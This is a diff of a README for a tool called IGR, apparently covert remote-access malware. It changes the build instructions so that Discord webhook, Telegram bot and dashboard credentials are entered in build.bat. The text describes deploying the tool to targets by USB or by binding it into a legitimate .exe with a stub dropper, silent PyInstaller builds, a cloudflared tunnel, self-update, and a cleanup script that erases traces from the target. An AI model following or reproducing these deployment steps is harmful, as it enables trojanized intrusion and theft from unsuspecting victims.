@@ -73,62 +73,35 @@ git clone https://github.com/whoevenisxeno/IGR.git
 cd IGR
 ```
 
-### Step 4: Configure
-
-Copy the example config and fill in your credentials:
-
-```batch
-copy config.example.txt config.txt
-```
-
-Edit `config.txt` - at minimum, set **Telegram** or **Discord**:
-
-```ini
-DISCORD_WEBHOOK=https://discord.com/api/webhooks/...
-DISCORD_USERNAME=IGR
-DASHBOARD_PASSWORD=YourPassword
-TELEGRAM_BOT_TOKEN=123456:ABC-DEF...
-TELEGRAM_CHAT_ID=987654321
-UPDATE_URL=
-```
-
-- **Telegram bot token** - Get from [@BotFather](https://t.me/BotFather) on Telegram
-- **Telegram chat ID** - Get from [@userinfobot](https://t.me/userinfobot)
-- **Discord webhook** - Create a webhook in any Discord channel settings
-- `config.txt` is gitignored - your credentials are never pushed
-
-### Step 5: Build
+### Step 4: Build
 
 ```batch
 build.bat
 ```
 
-This will ask for injection method:
-- **USB Stick** - Classic USB deployment
-- **EXE Bind** - Merge IGR into a legitimate .exe file
+This will ask for:
+1. **Injection method** - USB Stick or EXE Bind
+2. **EXE icon** - Python default, blank, or IGR logo
+3. **Configuration** - Discord webhook, Telegram bot token, dashboard password, etc.
 
-Then:
-1. Read `config.txt` and inject values into the build
-2. Install all Python dependencies (`pip install ...`)
-3. Download `cloudflared.exe` if missing
-4. Compile `igr_v7.exe` with PyInstaller (single file, no console)
-5. USB mode: detect USB drives and offer deployment
-6. EXE Bind mode: compile stub dropper, ask for target exe, bind everything
+Then it installs dependencies, downloads cloudflared, compiles with PyInstaller, and deploys.
 
-Output: `dist\igr_v7.exe` (USB) or `dist\<target_name>.exe` (bind)
+Output: `dist\igr_v7.1.exe` (USB) or `dist\<target_name>.exe` (bind)
 
 ---
 
 ## Configuration
 
-| Key | Required | Description |
-|-----|----------|-------------|
-| `TELEGRAM_BOT_TOKEN` | Yes* | Bot token from @BotFather |
-| `TELEGRAM_CHAT_ID` | Yes* | Your chat ID from @userinfobot |
-| `DISCORD_WEBHOOK` | Yes* | Discord webhook URL |
-| `DISCORD_USERNAME` | No | Bot display name (default: IGR) |
-| `DASHBOARD_PASSWORD` | No | Password for web dashboard |
-| `UPDATE_URL` | No | URL for self-update feature |
+All configuration is entered when you run `build.bat` - no config files needed.
+
+| Prompt | Required | Description |
+|--------|----------|-------------|
+| Discord Webhook URL | Yes* | Discord webhook URL for notifications |
+| Discord Bot Name | No | Bot display name (default: IGR) |
+| Dashboard Password | No | Password for web dashboard |
+| Telegram Bot Token | Yes* | Bot token from @BotFather |
+| Telegram Chat ID | Yes* | Your chat ID from @userinfobot |
+| Self-Update URL | No | URL for self-update feature |
 
 \* At least one of Telegram or Discord is required.
 
@@ -142,11 +115,12 @@ build.bat
 
 Build.bat will:
 - Ask for injection method: USB Stick or EXE Bind
-- Validate config (at least Discord webhook or Telegram bot token required)
+- Ask for exe icon: Python default, blank, or IGR logo
+- Ask for credentials (Discord webhook, Telegram token, dashboard password, etc.)
 - Inject credentials into a build copy of main.py
 - Install all Python dependencies
 - Download cloudflared.exe if not present
-- Build with PyInstaller → `dist\igr_v7.exe`
+- Build with PyInstaller → `dist\igr_v7.1.exe`
 - USB mode: detect plugged-in USB drives and offer to wipe+deploy or add IGR alongside existing files
 - EXE Bind mode: compile stub dropper, ask for target exe, bind stub+target+IGR into single exe
 
@@ -403,8 +377,6 @@ imagine/
 ├── build.bat            # Build script (PyInstaller) + USB/EXE bind + deployment
 ├── setup.bat            # USB deployment / install script (runs on target)
 ├── cleanup.bat          # Remove all traces from target
-├── config.example.txt   # Configuration template
-├── config.txt           # Credentials (gitignored)
 ├── logos/               # Logo assets
 └── README.md
 ```
